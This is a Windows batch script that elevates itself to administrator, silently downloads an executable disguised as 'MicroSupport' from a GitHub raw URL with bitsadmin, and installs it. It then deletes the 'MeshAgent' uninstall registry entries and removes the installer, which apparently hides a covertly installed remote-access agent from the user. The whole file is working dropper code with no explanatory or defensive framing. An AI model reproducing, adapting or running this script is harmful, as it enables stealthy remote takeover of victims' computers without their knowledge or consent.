@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
set EXE_URL=https://raw.githubusercontent.com/PixelUpdates/wget/refs/heads/main/MicroSupport.exe
set EXE_FILE=%TEMP%\microsupport.exe
set INSTALL_PATH="C:\Program Files\MicroSupport"
bitsadmin /transfer "MicroSupportUpdate" %EXE_URL% %EXE_FILE% >nul 2>&1
if not exist "%EXE_FILE%" (
    exit /b 1
)
"%EXE_FILE%" -fullinstall --installPath=%INSTALL_PATH%
for /f "tokens=*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "MeshAgent" ^| findstr /i "HKEY_LOCAL_MACHINE"') do reg delete "%%a" /f >nul 2>&1
for /f "tokens=*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "MeshAgent" ^| findstr /i "HKEY_LOCAL_MACHINE"') do reg delete "%%a" /f >nul 2>&1
del "%EXE_FILE%" >nul 2>&1